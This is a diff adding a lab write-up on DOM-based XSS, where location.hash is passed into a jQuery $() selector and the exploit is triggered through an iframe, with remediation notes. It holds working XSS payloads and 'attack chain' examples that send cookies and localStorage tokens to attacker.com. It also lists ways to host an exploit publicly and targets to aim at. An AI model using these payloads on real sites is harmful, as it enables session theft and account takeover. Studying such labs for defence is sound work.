@@ -2680,3 +2680,534 @@ DOM XSS → user-triggered execution
 If you control the link, you control the click  
 
 ---
+
+# Lab - 7 🐞 DOM-Based XSS via jQuery $() + location.hash + iframe exploit delivery
+
+---
+
+## 🔹 Overview
+
+DOM-Based Cross-Site Scripting (DOM XSS) happens when:
+
+1️⃣ User input enters through the URL (here: location.hash)  
+2️⃣ JavaScript reads that input  
+3️⃣ A dangerous function (sink) processes it  
+4️⃣ Browser parses it as HTML/JS and executes it  
+
+---
+
+### ⚠ Important in this lab
+
+- Vulnerability exists in client-side JavaScript  
+- Server response is completely safe  
+- Execution happens when hash changes + JS runs  
+
+---
+
+### 🔄 Flow
+
+User Input  
+→ location.hash  
+→ jQuery $()  
+→ DOM injection  
+→ Browser parses  
+→ Event executes  
+
+---
+
+## 🔹 What Is This Topic?
+
+This lab demonstrates DOM XSS using:
+
+👉 jQuery $() selector as a sink  
+👉 location.hash as a source  
+👉 iframe + onload for automatic execution  
+
+---
+
+### 🧠 Source
+
+location.hash  
+
+👉 Reads user-controlled data from URL:
+
+'#INPUT'
+
+---
+
+### 🧠 Sink
+
+'$(location.hash)'
+
+👉 Treats input as CSS selector / HTML → unsafe  
+
+---
+
+### ⚠ Important Behavior
+
+- jQuery may interpret input as HTML instead of selector  
+- Browser parses injected HTML  
+- Event handlers (onerror, onload) execute  
+- Requires trigger (hashchange event)  
+
+---
+
+## 🔹 Lab Walkthrough
+
+---
+
+### Step 1 — Open Homepage
+
+Website auto-scrolls using URL hash  
+
+---
+
+### Step 2 — Test Hash Input
+
+'#test123'
+
+✔ Page scrolls → confirms location.hash is used  
+
+---
+
+### Step 3 — Inspect JavaScript
+
+Found:
+```
+$(window).on("hashchange", function(){
+  var post = $("section.blog-list h2:contains(" + decodeURIComponent(window.location.hash.slice(1)) + ")");
+});
+```
+---
+
+### Step 4 — Identify Vulnerability
+
+👉 Input goes into:
+
+':contains(INPUT)'
+
+✔ No sanitization  
+✔ Fully user-controlled  
+
+---
+
+### Step 5 — Understand Problem
+
+👉 Payload must:
+
+- Break selector context  
+- Inject HTML  
+- Trigger execution  
+
+---
+
+### Step 6 — Use iframe (IMPORTANT)
+
+Direct payload may NOT trigger automatically  
+
+👉 Use:
+```
+<iframe src="https://LAB-ID/#"
+onload="this.src+=\'<img src=x onerror=print()>\'">
+</iframe>
+```
+---
+
+### Step 7 — What Happens
+
+Before:
+
+'https://lab-id/#'
+
+After onload:
+```
+https://lab-id/#<img src=x onerror=print()>'
+```
+---
+
+### Step 8 — Execution Flow
+
+1️⃣ iframe loads page  
+2️⃣ onload modifies hash  
+3️⃣ hashchange event fires  
+4️⃣ jQuery reads input  
+5️⃣ payload injected  
+6️⃣ browser parses  
+7️⃣ image fails → onerror runs  
+
+💥 print() executes  
+
+---
+
+### ✅ Lab solved
+
+---
+
+### 🔹 Exact Payload Used
+
+```
+<iframe src="https://LAB-ID/#"
+onload="this.src+=\'<img src=x onerror=print()>\'">
+</iframe>
+```
+
+---
+
+### 🔹 Where Input Goes
+
+URL → hash fragment (#INPUT)  
+
+---
+
+### 🔹 Source → Sink → Execution Flow
+
+location.hash  
+→ jQuery $()  
+→ DOM  
+→ browser parsing  
+→ event execution  
+
+---
+
+### 🔹 What Changed in DOM
+
+---
+
+Before:
+
+'#post1'
+
+---
+
+After:
+```
+<img src=x onerror=print()>
+```
+---
+
+## 🔹 Evidence / Screenshot (SS)
+
+![Hash payload injected and executed via iframe](../images/dom-xss-hash-iframe-execution.png)
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 1️⃣ jQuery Selector Injection (HIGHLY COMMON)
+
+'$(userInput)'
+
+Payload:
+```
+<img src=x onerror=alert(1)>
+```
+Seen in:
+
+- Blogs  
+- CMS systems  
+- Dashboards  
+
+---
+
+### 🟢 2️⃣ URL Hash Routing (SPA Apps)
+
+'#/profile'
+
+Payload:
+```
+#<img src=x onerror=alert(1)>
+```
+Used in:
+
+- React apps (older patterns)  
+- Angular hash routing  
+- Vue SPAs  
+
+---
+
+### 🟢 3️⃣ Auto-Scroll / Anchor Features
+
+Functions like:
+
+'scrollIntoView()'
+
+📌 Often trust location.hash blindly  
+
+---
+
+### 🟢 4️⃣ Dynamic Navigation Tabs
+
+Tabs controlled via:
+
+'#tab=profile'
+
+📌 Input inserted into DOM → XSS possible  
+
+---
+
+### 🟢 5️⃣ jQuery Plugins & UI Libraries
+
+- Sliders  
+- Carousels  
+- Modals  
+
+📌 Many legacy plugins use $() unsafely  
+
+---
+
+### 🟢 6️⃣ Search Highlight Features
+
+'highlight($(location.hash))'
+
+📌 Can lead to selector-based injection  
+
+---
+
+### 🟢 7️⃣ Comment / Blog Filtering
+
+Using:
+
+':contains(userInput)'
+
+📌 EXACT pattern from this lab — very real  
+
+---
+
+## 🎯 High-Value Targets
+
+---
+
+### 🔴 Hash-Based Features
+
+- #section  
+- #tab  
+- #view  
+- #page  
+
+---
+
+### 🔴 SPA / Frontend Routing
+
+- #/profile  
+- #/settings  
+- #/dashboard  
+
+---
+
+### 🔴 Blog / CMS Systems
+
+- /blog  
+- /posts  
+- /articles  
+
+---
+
+### 🔴 Admin Panels
+
+- /admin  
+- /manage  
+- /dashboard  
+
+---
+
+### 🔴 jQuery-Based Apps (CRITICAL)
+
+- Legacy SaaS  
+- Old enterprise dashboards  
+- Internal tools  
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Chain 1 — DOM XSS → Session Theft
+```
+<img src=x onerror="fetch(\'https://attacker.com?c=\'+document.cookie)">
+```
+→ Steal cookies  
+→ Hijack session  
+
+---
+
+### 🔥 Chain 2 — DOM XSS → Admin Takeover
+
+1. Send malicious link  
+2. Admin opens page  
+3. iframe triggers payload  
+4. Full admin compromise  
+
+---
+
+### 🔥 Chain 3 — DOM XSS → Token Exfiltration
+```
+<img src=x onerror="fetch(\'https://attacker.com?token=\'+localStorage.token)">
+```
+→ Steal JWT  
+→ Account takeover  
+
+---
+
+### 🔥 Chain 4 — DOM XSS → Silent Actions
+```
+<img src=x onerror="fetch(\'/change-email\',{method:\'POST\'})">
+```
+→ Perform actions silently  
+
+---
+
+### 🔥 Chain 5 — DOM XSS → Worm Propagation
+
+Payload auto-injects into:
+
+- Comments  
+- Posts  
+- Messages  
+
+→ Spreads across users  
+
+---
+
+## 🧪 Methodology
+
+- Add hash input  
+- Observe behavior  
+- Inspect JavaScript  
+- Identify source (location.hash)  
+- Identify sink ($())  
+- Try payload  
+- Use iframe for trigger  
+- Confirm execution  
+
+---
+
+## ⚠ Why This DOM XSS Is Special
+
+- Requires event trigger (hashchange)  
+- Uses jQuery selector parsing  
+- Needs iframe for reliable exploitation  
+- Hard to detect with scanners  
+
+---
+
+## 🛡 Remediation
+
+- Never pass user input into $()  
+- Sanitize input strictly  
+- Escape selector values  
+- Use safe DOM APIs  
+- Upgrade jQuery  
+- Implement CSP  
+
+---
+
+### ❌ NEVER
+
+- Trust location.hash  
+- Use dynamic selectors with user input  
+- Assume selectors are safe  
+
+---
+
+## 🌍 Real-World Exploit Delivery
+
+---
+
+### 🟢 1️⃣ Local HTML File
+
+Create:
+
+'exploit.html'
+
+Open locally or share  
+
+---
+
+### 🟢 2️⃣ Python HTTP Server (BEST)
+
+'python3 -m http.server 8000'
+
+Access:
+
+'http://your-ip:8000/exploit.html'
+
+---
+
+### 🟢 3️⃣ Ngrok (PUBLIC URL)
+
+'ngrok http 8000'
+
+→ Public exploit URL  
+
+---
+
+### 🟢 4️⃣ GitHub Pages / Netlify
+
+Host exploit permanently  
+
+---
+
+### 🔴 Netcat (Not Recommended)
+
+- No proper HTML rendering  
+- Not suitable for browser-based exploits  
+
+---
+
+## 💡 Notes / Mindset
+
+If jQuery parses your input → you can turn selectors into execution  
+
+---
+
+## 🧠 Mental Model
+
+Control hash  
+→ JS reads it  
+→ jQuery processes it  
+→ HTML injected  
+→ Browser parses  
+→ Event executes  
+
+---
+
+## 💡 Key Difference
+
+Reflected XSS → server execution  
+
+Stored XSS → persistent  
+
+DOM XSS → client-side execution with trigger  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+→ Can I control URL hash?  
+→ Is jQuery used?  
+→ Is $() processing input?  
+→ Can I trigger event automatically?  
+→ How will victim load payload?  
+
+---
+
+## 💡 Extra Tips
+
+- Always test
+```
+#<img src=x onerror=alert(1)>
+```
+- Look for jQuery usage  
+- Target :contains() selectors  
+- Focus on dynamic DOM filtering  
+
+---
+
+## 🧠 One-Line Memory Hook
+
+If jQuery parses your input, you can turn selectors into scripts  
+
+---
